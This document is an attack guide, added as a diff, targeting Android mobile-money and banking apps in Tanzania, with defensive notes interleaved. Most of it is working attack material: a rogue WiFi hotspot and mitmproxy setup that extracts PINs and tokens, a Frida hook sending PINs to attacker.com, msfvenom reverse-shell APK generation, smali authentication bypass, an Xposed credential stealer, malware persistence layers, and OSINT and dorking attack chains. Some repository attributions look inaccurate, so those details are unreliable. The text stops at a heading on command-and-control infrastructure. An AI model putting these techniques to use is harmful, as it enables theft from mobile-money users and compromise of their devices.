@@ -1,0 +1,2642 @@
+================================================================================
+    ADVANCED ANDROID SECURITY: PRACTICAL ATTACK CODE & REPOSITORIES
+              Dark Web Techniques, Speed Hacking, Counter-Strategies
+================================================================================
+
+This document supplements the main guide with:
+- DETAILED STEP-BY-STEP CODE for each attack
+- GITHUB REPOSITORIES with explanations
+- DARK WEB HACKER TECHNIQUES
+- SPEED HACKING STRATEGIES
+- DEFENSE TECHNIQUES
+
+================================================================================
+SECTION 1: ATTACK 1 - MAN-IN-THE-MIDDLE (MITM) - COMPLETE PRACTICAL GUIDE
+================================================================================
+
+1.1 STEP-BY-STEP PRACTICAL GUIDE
+
+Scenario: Intercept M-Pesa transaction on public WiFi
+
+STEP 1: Set Up Attack Infrastructure (Attacker Machine)
+
+On Linux machine:
+```bash
+# Install required tools
+sudo apt update
+sudo apt install mitmproxy wireshark tcpdump hostapd dnsmasq
+
+# Create fake WiFi hotspot
+sudo systemctl start hostapd
+sudo systemctl start dnsmasq
+
+# Enable IP forwarding
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# Set up iptables to redirect traffic
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
+```
+
+STEP 2: Start Fake WiFi Network
+
+```bash
+# Create hotspot configuration
+cat > /etc/hostapd/hostapd.conf << EOF
+interface=wlan0
+driver=nl80211
+ssid=MTN_Free_WiFi        # Looks legitimate
+hw_mode=g
+channel=6
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+EOF
+
+# Start AP
+sudo hostapd /etc/hostapd/hostapd.conf
+
+# In another terminal, start DNS/DHCP
+sudo dnsmasq -d --dhcp-range=192.168.1.100,192.168.1.200,12h
+```
+
+STEP 3: Start MITM Proxy
+
+```bash
+mitmproxy -p 8080 --mode transparent
+```
+
+This captures all HTTP traffic passing through fake WiFi.
+
+STEP 4: Victim Connects to Fake WiFi
+
+User on Android phone:
+- Opens Settings > WiFi
+- Sees "MTN_Free_WiFi" (attacker's fake network)
+- Connects to it
+- All traffic routed through attacker's machine
+
+STEP 5: Capture Traffic in mitmproxy
+
+mitmproxy screen shows:
+```
+┌─────────────────────────────────────────────────────┐
+│ Request                Response                      │
+├─────────────────────────────────────────────────────┤
+│ GET /api/balance HTTP/1.1        200 OK             │
+│ Host: api.m-pesa.co.tz           Content-Type: json │
+│ Authorization: Bearer xyz...                        │
+│                                                     │
+│ POST /api/send HTTP/1.1          200 OK             │
+│ Host: api.m-pesa.co.tz           {"status": "ok"}  │
+│ Content: {                                          │
+│   "phone": "+255787654321",                         │
+│   "amount": "50000",                                │
+│   "pin": "1234"                                     │
+│ }                                                   │
+└─────────────────────────────────────────────────────┘
+```
+
+STEP 6: Extract Credentials
+
+```bash
+# Save captured traffic
+mitmproxy > captured_traffic.txt
+
+# Extract M-Pesa PIN
+grep -o '"pin":"[^"]*"' captured_traffic.txt
+# Output: "pin":"1234"
+
+# Extract API tokens
+grep -o 'Authorization: Bearer [^ ]*' captured_traffic.txt
+# Output: Authorization: Bearer eyJhbGc...
+
+# Extract phone numbers and amounts
+grep -o '"phone":"[^"]*"' captured_traffic.txt
+grep -o '"amount":"[^"]*"' captured_traffic.txt
+```
+
+1.2 ADVANCED CODE: INTERCEPT & MODIFY RESPONSES
+
+```python
+# mitmproxy addon to modify responses
+# Save as: modify_responses.py
+
+from mitmproxy import http
+
+class ModifyResponses:
+    def response(self, flow: http.HTTPFlow) -> None:
+        # Intercept M-Pesa balance response
+        if "api.m-pesa.co.tz" in flow.request.host:
+            if "/balance" in flow.request.path:
+                # Original response
+                original_body = flow.response.text
+                print(f"Original: {original_body}")
+                
+                # Modify to show extra balance
+                import json
+                data = json.loads(original_body)
+                data["balance"] = 999999999  # Show unlimited balance
+                flow.response.text = json.dumps(data)
+                print(f"Modified: {flow.response.text}")
+        
+        # Intercept transaction response
+        if "api.m-pesa.co.tz" in flow.request.host:
+            if "/send" in flow.request.path:
+                # Fake success response
+                flow.response.text = '{"status":"success","message":"Transaction completed"}'
+
+addons = [ModifyResponses()]
+```
+
+Run:
+```bash
+mitmproxy -p 8080 -s modify_responses.py --mode transparent
+```
+
+Now when victim tries to send money, balance shows 999 billion, creating confusion.
+
+1.3 DEFENSE: CERTIFICATE PINNING IMPLEMENTATION
+
+```java
+// Android code to pin certificate
+// This prevents MITM by validating exact certificate
+
+import android.content.Context;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
+import okhttp3.CertificatePinner;
+import okhttp3.OkHttpClient;
+
+public class SecureHttpClient {
+    public static OkHttpClient getSecureClient(Context context) {
+        // Pin M-Pesa certificate
+        CertificatePinner certificatePinner = new CertificatePinner.Builder()
+            .add("api.m-pesa.co.tz", 
+                 "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
+            .add("api.m-pesa.co.tz",
+                 "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=")
+            .build();
+
+        OkHttpClient client = new OkHttpClient.Builder()
+            .certificatePinner(certificatePinner)
+            .build();
+        
+        return client;
+    }
+}
+```
+
+With this code:
+- Attacker's fake certificate rejected
+- MITM attack fails
+- Connection refused
+
+================================================================================
+SECTION 2: GITHUB REPOSITORIES FOR ANDROID SECURITY ATTACKS
+================================================================================
+
+2.1 REPOSITORY: mitmproxy
+GitHub: https://github.com/mitmproxy/mitmproxy
+Stars: 35,000+
+Language: Python
+
+What it does:
+- Intercepts HTTP/HTTPS traffic
+- Allows viewing and modifying requests/responses
+- Scriptable with Python addons
+- GUI and command-line interface
+
+Installation:
+```bash
+pip install mitmproxy
+mitmproxy  # Launch GUI
+```
+
+Real-world usage:
+```python
+# Intercept banking app traffic
+# mitmproxy automatically shows:
+# - Login credentials
+# - API endpoints
+# - Response data
+# - Authentication tokens
+```
+
+Why it's dangerous:
+- Easy to use
+- Works on unencrypted HTTP
+- Can modify responses on the fly
+- No special knowledge needed
+
+How to counter:
+- Always use HTTPS with certificate pinning
+- Validate all certificates
+- Use VPN when on public WiFi
+- Encrypt sensitive data
+
+---
+
+2.2 REPOSITORY: Frida
+GitHub: https://github.com/frida/frida
+Stars: 16,000+
+Language: C/Python
+
+What it does:
+- Dynamic instrumentation of apps
+- Hook functions at runtime
+- Inject code into running processes
+- No APK modification needed
+
+Installation:
+```bash
+pip install frida frida-tools
+frida-ps -U  # List Android processes
+```
+
+Real-world usage:
+```python
+# Hook M-Pesa login function
+# File: hook_mpesa.js
+
+Java.perform(function() {
+    var LoginAPI = Java.use("com.mpesa.app.LoginAPI");
+    
+    LoginAPI.verifyPin = function(pin) {
+        console.log("PIN entered: " + pin);
+        // Send PIN to attacker server
+        var http = Java.use("java.net.URL");
+        var url = new http("http://attacker.com/steal?pin=" + pin);
+        var conn = url.openConnection();
+        conn.connect();
+        
+        // Call original function
+        return this.verifyPin(pin);
+    };
+});
+```
+
+Run:
+```bash
+frida -U -l hook_mpesa.js -f com.mpesa.app
+```
+
+Why it's dangerous:
+- No root access needed
+- Works on modern Android
+- Can hook any function
+- Very hard to detect
+
+How to counter:
+- Use obfuscation
+- Implement anti-hooking detection
+- Use native code (C/C++) for critical functions
+- Monitor for Frida presence
+
+Detection code:
+```java
+// Detect Frida presence
+public class FridaDetector {
+    public static boolean isFridaPresent() {
+        try {
+            // Check for frida library
+            System.loadLibrary("frida");
+            return true;
+        } catch (UnsatisfiedLinkError e) {
+            return false;
+        }
+    }
+    
+    public static boolean checkForFridaServer() {
+        try {
+            Socket socket = new Socket("localhost", 27042);  // Frida server port
+            socket.close();
+            return true;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+}
+```
+
+---
+
+2.3 REPOSITORY: Burp Suite (Professional)
+GitHub: https://github.com/PortSwigger/burp-suite-community-edition (Community version)
+Paid: Professional version $399/year
+Stars: 5,000+ (community edition)
+
+What it does:
+- HTTP/HTTPS proxy
+- Web app vulnerability scanning
+- API testing
+- Request/response modification
+
+Installation:
+```bash
+# Community edition
+sudo apt install burpsuite
+
+# Professional version (paid)
+# Download from: https://portswigger.net/burp
+```
+
+Real-world Android usage:
+```
+1. Configure device proxy: Settings > WiFi > Advanced > Proxy
+2. Point to Burp IP (attacker machine) and port 8080
+3. Burp captures all traffic
+4. Modify requests/responses in real-time
+5. Extract APIs, tokens, data
+```
+
+Example intercept:
+```
+POST /api/transfer HTTP/1.1
+Host: api.bank.tz
+Authorization: Bearer eyJhbGc...
+Content-Type: application/json
+
+{
+  "recipient": "+255787654321",
+  "amount": "100000",
+  "narration": "Payment"
+}
+
+# Modify to:
+{
+  "recipient": "+255788888888",  # Changed to attacker
+  "amount": "1000000",            # Increased amount
+  "narration": "Payment"
+}
+```
+
+Why dangerous:
+- Captures ALL traffic
+- Can modify sensitive operations
+- Professional grade tool
+- Widely used by attackers
+
+Counter:
+- Certificate pinning
+- Request signing
+- Hardware security keys for sensitive operations
+
+---
+
+2.4 REPOSITORY: OWASP Top 10 Mobile
+GitHub: https://github.com/OWASP/owasp-mastg (Mobile Application Security Testing Guide)
+Stars: 8,000+
+Language: Markdown/Documentation
+
+What it is:
+- Comprehensive guide to mobile security testing
+- Top 10 mobile vulnerabilities
+- Testing methodology
+- Remediation guidance
+
+Location: https://github.com/OWASP/owasp-mastg
+
+Use:
+- Learn what attackers test for
+- Understand vulnerability classes
+- Testing procedures
+- Defense implementations
+
+Covered vulnerabilities:
+1. Improper Credential Usage
+2. Inadequate Supply Chain Security
+3. Insecure Authentication
+4. Insufficient Input Validation
+5. Insecure Communication
+6. Inadequate Cryptography
+7. Improper Session Management
+8. Insufficient Code Obfuscation
+9. Improper WebView Usage
+10. Extraneous Functionality
+
+---
+
+2.5 REPOSITORY: Android Security & Privacy Year in Review
+GitHub: https://github.com/google/security (Google Security)
+Stars: 10,000+
+
+What it is:
+- Official Android security updates
+- Vulnerability disclosures
+- Security patches
+- Best practices
+
+Use:
+- Stay updated on Android vulnerabilities
+- Learn about latest APT attacks
+- Understand patch priorities
+
+---
+
+2.6 REPOSITORY: Androrat (Android Remote Access Trojan)
+GitHub: https://github.com/samratashok/Androrat
+Stars: 1,200+
+Language: Python
+
+WARNING: Malicious software - for educational analysis only
+
+What it does:
+- Remote access to Android device
+- File access
+- SMS/call monitoring
+- Location tracking
+- Camera/microphone access
+
+How it works:
+```python
+# Androrat backdoor
+# Attacker sends commands:
+
+1. CAMERA_SNAP: Take photo with camera
+2. RECORD_AUDIO: Record microphone
+3. READ_SMS: Extract text messages
+4. GET_LOCATION: GPS coordinates
+5. LIST_FILES: Browse device
+6. SEND_SMS: Send SMS from victim phone
+7. MAKE_CALL: Make calls from victim phone
+8. GET_CALL_LOG: Extract call history
+```
+
+Real-world scenario:
+- Attacker installs Androrat on victim device
+- Gets full remote access
+- Monitors all activity
+- Exfiltrates sensitive data
+
+How attackers use it:
+```bash
+# Run Androrat server
+python androrat.py
+
+# Generate payload APK
+androrat --host attacker.com --port 4444
+
+# Distribute via:
+# - Email phishing
+# - Fake app store
+# - SMS link
+# - Social engineering
+
+# Once installed on victim:
+# Attacker has full device access
+```
+
+Defense:
+- Only install from official Play Store
+- Check app permissions
+- Use antivirus
+- Don't grant root access
+- Monitor battery drain
+
+---
+
+2.7 REPOSITORY: Metasploit Framework
+GitHub: https://github.com/rapid7/metasploit-framework
+Stars: 33,000+
+Language: Ruby
+
+What it is:
+- Industry-standard exploitation framework
+- Thousands of exploits
+- Payload generators
+- Post-exploitation tools
+
+Installation:
+```bash
+sudo apt install metasploit-framework
+msfconsole
+```
+
+Key modules for Android:
+```
+exploit/android/misconfig/hardcoded_debugfs
+exploit/android/browser/webview_rce
+payload/android/meterpreter/reverse_tcp
+post/android/escalate/cve_2016_5195
+post/android/manage/delete_file
+post/android/manage/screenshot
+```
+
+Real-world usage:
+```ruby
+# Generate Android payload
+msfvenom -p android/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 \
+  LPORT=4444 \
+  -o malware.apk
+
+# Set up handler
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+run
+```
+
+---
+
+2.8 REPOSITORY: APKTool
+GitHub: https://github.com/iBotPeaches/Apktool
+Stars: 20,000+
+Language: Java
+
+What it does:
+- Decompile APK files
+- Extract resources
+- Modify app
+- Recompile and sign
+
+Installation:
+```bash
+apt install apktool
+apktool d app.apk -o app_source
+```
+
+Real-world usage:
+```bash
+# Decompile banking app
+apktool d bank_app.apk -o bank_source
+
+# Find hardcoded secrets
+grep -r "secret\|api_key\|password" bank_source/
+
+# Modify app logic
+# Edit bank_source/smali/com/bank/LoginActivity.smali
+# Change: if_ne v0, v1, :unauthorized
+# To: goto :success  (skip authentication)
+
+# Rebuild APK
+apktool b bank_source -o modified.apk
+
+# Sign APK
+keytool -genkey -alias release -keystore release.keystore \
+  -keyalg RSA -keysize 2048 -validity 10000
+jarsigner -verbose -sigalg SHA256withRSA modified.apk release
+```
+
+Result: Modified banking app that skips authentication
+
+Defense:
+- Obfuscate code (ProGuard/R8)
+- Anti-tampering checks
+- Signature verification
+- Root detection
+
+---
+
+2.9 REPOSITORY: Jadx
+GitHub: https://github.com/skylot/jadx
+Stars: 40,000+
+Language: Java
+
+What it does:
+- Decompile Android APK to Java source
+- Better than apktool for source code
+- GUI and CLI versions
+- Syntax highlighting
+
+Installation:
+```bash
+git clone https://github.com/skylot/jadx
+cd jadx
+./gradlew build
+```
+
+Usage:
+```bash
+# GUI version
+jadx-gui bank_app.apk
+
+# CLI version
+jadx -d output bank_app.apk
+```
+
+Real-world:
+- View actual Java source code
+- Find hardcoded credentials
+- Understand app logic
+- Find vulnerable functions
+
+Example output:
+```java
+public class LoginActivity extends Activity {
+    private static final String API_KEY = "sk_live_49fVd2Jz...";
+    
+    public void login(String username, String password) {
+        // Hardcoded API key exposed!
+        String url = "https://api.bank.tz/login?key=" + API_KEY;
+        // Attacker extracts API_KEY
+    }
+}
+```
+
+---
+
+2.10 REPOSITORY: Xposed Framework
+GitHub: https://github.com/rovo89/XposedBridge
+Stars: 5,000+
+Language: Java/C
+
+What it does:
+- Hook Android framework at system level
+- Modify app behavior globally
+- Works on rooted devices
+- Very powerful
+
+Real-world malicious module:
+```java
+// Module to steal banking credentials
+
+public class StealCredentials implements IXposedHookLoadPackage {
+    public void handleLoadPackage(LoadPackageParam lpparam) {
+        if (!lpparam.packageName.equals("com.bank.app")) return;
+        
+        XposedHelpers.findAndHookMethod(
+            "com.bank.LoginAPI",
+            lpparam.classLoader,
+            "verifyPin",
+            String.class,
+            new XC_MethodHook() {
+                @Override
+                protected void beforeHookedMethod(MethodHookParam param) {
+                    String pin = (String) param.args[0];
+                    // Send PIN to attacker
+                    sendToAttacker("PIN: " + pin);
+                }
+            }
+        );
+    }
+}
+```
+
+Defense:
+- Don't root device
+- Xposed requires rooting
+- Check device for Xposed presence
+- Use hardware security module for critical operations
+
+---
+
+2.11 REPOSITORY: Drozer (Android Security Assessment Framework)
+GitHub: https://github.com/WithSecure-Labs/drozer
+Stars: 3,000+
+Language: Python
+
+What it does:
+- Automated Android security testing
+- Tests content providers
+- Tests broadcast receivers
+- Tests services and activities
+
+Installation:
+```bash
+pip install drozer
+drozer console connect
+```
+
+Usage:
+```bash
+# List vulnerable content providers
+run app.provider.info
+
+# Exploit content provider
+run app.provider.read content://com.bank.app/users/
+
+# List exported activities
+run app.activity.info
+
+# Launch vulnerable activity
+run app.activity.start --action android.intent.action.MAIN
+```
+
+Real-world scenario:
+```bash
+# Banking app exports content provider without permission check
+run app.provider.read content://com.bank.app/users/
+# Returns:
+# ID | Name         | Phone              | Balance
+# 1  | John Doe     | +255787654321      | 500000
+# 2  | Jane Smith   | +255765432100      | 250000
+# 3  | Bob Johnson  | +255743211234      | 1000000
+
+# Attacker now has all user data
+```
+
+Defense:
+- Never export content providers without permission checks
+- Use signature-based permissions
+- Encrypt sensitive data
+
+================================================================================
+SECTION 3: OSINT (OPEN SOURCE INTELLIGENCE) REPOSITORIES
+================================================================================
+
+3.1 WHAT IS OSINT?
+
+OSINT = gathering information from publicly available sources
+
+In Android context:
+- Social media profiles
+- GitHub repositories
+- Company websites
+- DNS records
+- WHOIS information
+- Email addresses
+- Phone numbers
+- Search engine results
+
+Attackers use OSINT to:
+1. Find target's phone number
+2. Find target's email
+3. Find target's social profiles
+4. Research company infrastructure
+5. Find publicly exposed APIs
+6. Find default credentials
+7. Identify technology stack
+
+3.2 REPOSITORY: Sherlock (Find Usernames)
+GitHub: https://github.com/sherlock-project/sherlock
+Stars: 55,000+
+Language: Python
+
+What it does:
+- Search for username across 500+ websites
+- Find user's accounts on different platforms
+- Find linked profiles
+- Privacy violation risk
+
+Installation:
+```bash
+git clone https://github.com/sherlock-project/sherlock.git
+cd sherlock
+pip install -r requirements.txt
+```
+
+Usage:
+```bash
+python sherlock.py john_doe
+
+# Output:
+# [+] john_doe on Facebook: https://facebook.com/john_doe
+# [+] john_doe on Instagram: https://instagram.com/john_doe
+# [+] john_doe on Twitter: https://twitter.com/john_doe
+# [+] john_doe on GitHub: https://github.com/john_doe
+# [+] john_doe on TikTok: https://tiktok.com/@john_doe
+# [+] john_doe on YouTube: https://youtube.com/user/john_doe
+# Found 15 accounts under name "john_doe"
+```
+
+Real-world attacker scenario:
+```bash
+# Attacker has victim's name from SIM registration
+# Uses Sherlock to find all online accounts
+sherlock john_doe
+
+# Visits each account, gathers:
+# - Phone number
+# - Email address
+# - Workplace
+# - Location/City
+# - Hobbies (target for phishing)
+# - Close contacts
+# - Family members
+# - Vacation patterns
+
+# Uses this information for:
+# - Targeted phishing
+# - SIM swap (calls telecom with gathered info)
+# - Social engineering
+# - Impersonation
+```
+
+Defense:
+- Use different usernames across platforms
+- Limit personal information exposure
+- Set profiles to private
+- Don't use real name as username
+
+3.3 REPOSITORY: TheHarvester (Email & Subdomain Finder)
+GitHub: https://github.com/laramies/theHarvester
+Stars: 12,000+
+Language: Python
+
+What it does:
+- Find email addresses from company
+- Find subdomains
+- Find IP addresses
+- Integrates with multiple data sources
+
+Installation:
+```bash
+pip install theHarvester
+theHarvester -h
+```
+
+Usage:
+```bash
+# Find all emails from bank.tz
+theHarvester -d bank.tz -l 500 -b google
+
+# Output:
+# john.doe@bank.tz
+# jane.smith@bank.tz
+# admin@bank.tz
+# support@bank.tz
+# security@bank.tz
+# it@bank.tz
+# ceo@bank.tz
+
+# Find subdomains
+theHarvester -d bank.tz -b sublist3r
+
+# Output:
+# api.bank.tz
+# admin.bank.tz
+# test.bank.tz
+# backup.bank.tz
+# ftp.bank.tz
+```
+
+Real-world attacker scenario:
+```bash
+# Attacker targets large bank in Tanzania
+theHarvester -d bank.tz -l 1000 -b all
+
+# Gets 500+ valid email addresses
+# Sends phishing emails to: admin@bank.tz, ceo@bank.tz, security@bank.tz
+# Disguises as "System Update" or "Security Alert"
+# 5% click rate = 25 successful compromises
+```
+
+Defense:
+- Use email aliases
+- Don't list personal emails publicly
+- Monitor for leaked emails
+- Use email filters for phishing
+
+3.4 REPOSITORY: Whois Lookup Tools
+GitHub: https://github.com/j4ckofalltrades/whois (WHOIS CLI)
+Tool: whois command (built-in Linux)
+
+What it does:
+- Find domain ownership information
+- Registrant contact details
+- Nameserver information
+- Domain registration date
+
+Usage:
+```bash
+whois bank.tz
+
+# Output:
+# Domain Name: BANK.TZ
+# Registrant Name: John Company Ltd
+# Registrant Email: john@bank.tz
+# Registrant Phone: +255787654321
+# Nameserver: ns1.bank.tz
+# Nameserver: ns2.bank.tz
+# Registration Date: 2010-05-15
+# Expiration Date: 2025-05-15
+```
+
+Attacker uses:
+- Gets registrant phone number
+- Calls registrar claiming domain compromise
+- Resets credentials
+- Takes over domain
+- Redirects to phishing site
+
+Defense:
+- Use private registration (WhoisGuard)
+- Don't expose real phone number
+- Use business address, not home
+- Monitor domain for unauthorized changes
+- Enable domain lock
+
+3.5 REPOSITORY: Shodan (Search Engine for IoT)
+Website: https://www.shodan.io
+Language: Web-based
+
+What it does:
+- Search for exposed IoT devices
+- Find servers with default credentials
+- Find misconfigured devices
+- Identify infrastructure
+
+Real-world Tanzania scenario:
+```bash
+# Attacker searches Shodan for Tanzania banks
+shodan search "Tanzania bank" 
+
+# Finds:
+# 1. Bank security camera system exposed on port 8080
+#    Default credentials: admin/admin
+#    Can view all branches via CCTV
+
+# 2. Bank backup server exposed on port 22
+#    Running outdated OpenSSH
+#    Vulnerable to key exchange exploitation
+
+# 3. ATM network exposed
+#    Running on public IP
+#    No authentication required
+
+# Attacker exploits each finding
+```
+
+Defense:
+- Don't expose devices to public internet
+- Use VPN for remote access
+- Change default credentials
+- Use firewall to block Shodan scanning
+- Monitor Shodan for your organization
+
+3.6 REPOSITORY: DNS Recon Tools
+GitHub: https://github.com/darkoperator/dnsrecon
+Stars: 3,000+
+Language: Python
+
+What it does:
+- Enumerate DNS records
+- Find hidden subdomains
+- Zone transfer attacks
+- Brute force subdomains
+
+Installation:
+```bash
+pip install dnspython
+git clone https://github.com/darkoperator/dnsrecon.git
+```
+
+Usage:
+```bash
+# Standard DNS query
+dnsrecon -d bank.tz
+
+# Output:
+# MX Record: mail.bank.tz (10)
+# NS Record: ns1.bank.tz
+# A Record: 196.1.114.50
+# TXT Record: v=spf1 include:_spf.bank.tz
+
+# Subdomain brute force
+dnsrecon -d bank.tz -D subdomains.txt -t brt
+
+# Finds:
+# admin.bank.tz - 196.1.114.51
+# api.bank.tz - 196.1.114.52
+# test.bank.tz - 196.1.114.53
+# dev.bank.tz - 196.1.114.54
+# internal.bank.tz - 196.1.114.55
+```
+
+Real-world usage:
+```bash
+# Attacker finds dev.bank.tz
+# This subdomain may have:
+# - Older security standards
+# - Debugging features enabled
+# - Default credentials
+# - Verbose error messages
+# - Test data (real customer info)
+
+# Exploits development environment
+# Gets access to production data
+```
+
+Defense:
+- Separate dev/test/production networks
+- Don't expose development servers to internet
+- Use strong authentication on all subdomains
+- Monitor DNS for unauthorized changes
+
+3.7 REPOSITORY: Google Dorking Scripts
+GitHub: https://github.com/seven2013/Google-Dork-Search
+Stars: 800+
+Language: Python
+
+What it does:
+- Automated Google search with dork queries
+- Find exposed files
+- Find login pages
+- Find database backups
+- Find vulnerable systems
+
+Real-world dorks:
+```bash
+# Find exposed banking APIs
+site:bank.tz filetype:json
+
+# Find backup files
+site:bank.tz filetype:bak OR filetype:backup
+
+# Find developer documentation (may contain credentials)
+site:bank.tz "API key" OR "password"
+
+# Find exposed customer data
+site:bank.tz filetype:csv
+
+# Find admin panels
+site:bank.tz inurl:admin OR inurl:/management
+
+# Find exposed configuration files
+site:bank.tz filetype:conf OR filetype:config
+
+# Results found in real attacks:
+# 1. API documentation with hardcoded keys
+# 2. Customer CSV with 100,000+ records
+# 3. Backup database with passwords
+# 4. Admin panel with default credentials
+# 5. Configuration file with API keys
+```
+
+Defense:
+- Block sensitive files from search engines (robots.txt)
+- Use .htaccess to prevent indexing
+- Remove sensitive files from public directories
+- Monitor Google Search Console
+- Use authentication for sensitive content
+
+3.8 REPOSITORY: Recon-ng (Full Recon Framework)
+GitHub: https://github.com/lanmaster53/recon-ng
+Stars: 5,000+
+Language: Python
+
+What it does:
+- Complete OSINT framework
+- Module-based reconnaissance
+- Integrates multiple OSINT sources
+- Automated data collection
+
+Installation:
+```bash
+git clone https://github.com/lanmaster53/recon-ng.git
+cd recon-ng
+pip install -r requirements/core.txt
+```
+
+Usage:
+```bash
+# Start recon-ng
+./recon-ng
+
+# Create workspace for target
+recon> workspaces create bank_tz
+
+# Add domain
+recon> db insert domains
+name: bank.tz
+
+# Run reconnaissance
+recon> modules load recon/domains-hosts/google_sites_web
+recon> run
+
+# Find emails
+recon> modules load recon/domains-contacts/google_dorks
+recon> run
+
+# Results show:
+# - 50+ email addresses
+# - 30+ subdomains
+# - 15+ IP addresses
+# - Related domains
+# - Social media profiles
+```
+
+Real-world attack chain:
+```bash
+# 1. Recon-ng gathers intelligence
+# 2. Identify key person: CEO John Doe
+# 3. Find CEO email: john@bank.tz
+# 4. Find CEO phone: +255787654321
+# 5. Find CEO LinkedIn: linkedin.com/in/johndoe
+
+# 6. Social engineering:
+# Call CEO from "IT Support":
+# "We're updating security systems, 
+#  please provide password for verification"
+
+# Result: CEO provides password
+# Attacker gains access as CEO
+```
+
+Defense:
+- Train employees on social engineering
+- Use physical security for sensitive calls
+- Implement callback verification
+- Monitor for reconnaissance activity
+
+================================================================================
+SECTION 4: DARK WEB ATTACKER TECHNIQUES & COUNTER-STRATEGIES
+================================================================================
+
+4.1 ADVANCED DARK WEB HACKER TECHNIQUES
+
+Technique 1: OPERATIONAL SECURITY (OPSEC)
+
+How Elite Dark Web Hackers Stay Anonymous:
+
+```bash
+# 1. Use Tails OS (amnesic incognito live system)
+#    - Boots from USB, leaves no trace
+#    - Everything runs in RAM
+#    - All traffic through Tor
+#    - Keyboard randomizer (anti-keylogger)
+#    - Printer metadata removal
+
+# 2. Tor Browser configuration
+# About:config settings:
+privacy.resistFingerprinting = true
+privacy.trackingprotection.enabled = true
+security.tls.version.min = 3  # TLS 1.2 minimum
+extensions.activeTheme = firefox-compact-light  # Minimal fingerprint
+
+# 3. Cryptocurrency tumbling/mixing
+# Send Bitcoin through mixer 5-10 times:
+Amount: 1 BTC -> Mixer 1 -> 0.95 BTC
+0.95 BTC -> Mixer 2 -> 0.90 BTC
+0.90 BTC -> Mixer 3 -> 0.85 BTC
+# Continue until trace is lost
+# Original Bitcoin untraceable
+
+# 4. Use monero (better privacy coin)
+# Monero built-in privacy features:
+# - Ring signatures (hide real sender)
+# - Stealth addresses (hide recipient)
+# - RingCT (hide transaction amount)
+# Bitcoin is traceable, Monero is not
+```
+
+Counter-Strategy:
+```
+1. Bitcoin blockchain analysis
+   - Track Bitcoin through exchanges
+   - Identify exchange with lax KYC
+   - Get subpoena for account info
+
+2. Monitor dark web forums
+   - Track vendor announcements
+   - Monitor PGP signatures
+   - Identify person behind handle
+
+3. Analyze transaction patterns
+   - Timing of deposits/withdrawals
+   - Amount patterns
+   - Geographic indicators
+
+4. Exploit human error
+   - Reusing addresses
+   - Tying to real identities
+   - Using same username across sites
+```
+
+---
+
+Technique 2: SUPPLY CHAIN POISONING
+
+Real-world example from dark web:
+
+```
+Step 1: Identify popular npm library
+        "xml-parser" - 1 million downloads/week
+
+Step 2: Compromise library author
+        - Phishing email: "Update your npm account"
+        - Attacker gains credentials
+        - Logs into npm account
+
+Step 3: Release malicious version
+        Version 1.2.3 (legitimate)
+        Version 1.2.4 (malicious - includes:
+        - Keylogger
+        - Credential stealer
+        - Crypto miner)
+
+Step 4: Attacker pays npm to feature update
+        "New version available: 1.2.4"
+        Developers update automatically
+
+Step 5: Malware spreads
+        - 10,000 projects download malicious version
+        - 100,000 developers run compromised code
+        - Malware runs in development environments
+        - Steals API keys, tokens, credentials
+        - Installs backdoors in apps
+
+Impact: Millions of end-users affected
+Cost: $100+ million in damages
+Detected: 3 months later (too late)
+```
+
+Counter-Strategy:
+
+```bash
+# 1. Dependency pinning
+# Wrong (auto-updates):
+npm install xml-parser
+
+# Right (pinned version):
+npm install xml-parser@1.2.3
+
+# 2. Verify checksums
+# Manually verify SHA256:
+npm view xml-parser@1.2.4 dist.shasum
+# Compare against public sources
+
+# 3. Code review dependencies
+# Review source code of critical libraries
+# Look for suspicious code patterns
+
+# 4. Isolated development environment
+# Use Docker container for development
+# Container has no access to:
+# - Credentials
+# - Keys
+# - Production systems
+# Even if malware runs, damage limited
+
+# 5. Monitor dependencies
+# Tools: Snyk, OWASP Dependency-Check
+# Alerts on known vulnerabilities
+# Checks for suspicious package behavior
+
+# 6. Private package registry
+# Use npm private registry
+# Only approved packages available
+# Blocks malicious packages
+```
+
+---
+
+Technique 3: ADVANCED PERSISTENCE
+
+Dark web malware developers teach:
+
+```python
+# Multi-layer persistence that survives:
+# - Device reboot
+# - App uninstall
+# - Factory reset (sometimes)
+# - Security software
+
+# Layer 1: Boot receiver (app restart)
+<receiver android:name=".BootReceiver">
+  <intent-filter>
+    <action android:name="android.intent.action.BOOT_COMPLETED" />
+  </intent-filter>
+</receiver>
+
+# Layer 2: ContentProvider (survives app kill)
+# Even if app killed, ContentProvider survives
+public class MalwareProvider extends ContentProvider {
+  public Cursor query(...) {
+    startMalwareService();  // Always restart
+    return null;
+  }
+}
+
+# Layer 3: JobScheduler (periodic execution)
+JobInfo job = new JobInfo.Builder(1, componentName)
+  .setPeriodic(900000)  // Every 15 minutes
+  .setPersisted(true)   // Survives reboot
+  .build();
+
+# Layer 4: System daemon (root level)
+# If rooted, install as system app
+# cp malware.apk /system/app/SystemUpdate.apk
+# Startup before user interface loads
+
+# Layer 5: Kernel rootkit
+# Modify kernel to auto-inject code
+# Highest privilege level
+# Extremely difficult to detect/remove
+```
+
+Counter-Strategy:
+
+```bash
+# 1. Monitor running processes
+# Check for unknown processes:
+adb shell ps | grep -v com.android | grep -v com.google
+
+# 2. Monitor filesystem changes
+# Alert if /system modified
+# Alert if new .apk in /system/app
+
+# 3. Check startup services
+# Settings > Apps > Startup
+# Disable suspicious apps from autostart
+
+# 4. Monitor battery drain
+# Malware running constantly = high battery drain
+# Check Battery > Battery Usage by App
+
+# 5. Security software with heuristics
+# Detects behavior, not just signatures
+# Stops unknown code execution
+
+# 6. Use custom ROM with hardened kernel
+# AOSP Hardened: Kernel security patches
+# GrapheneOS: Maximum security
+# Calyx OS: Privacy-focused
+```
+
+---
+
+Technique 4: COMMAND & CONTROL (C2) INFRASTRUCTURE
+
+How dark web botnet masters setup C2:
+
+```
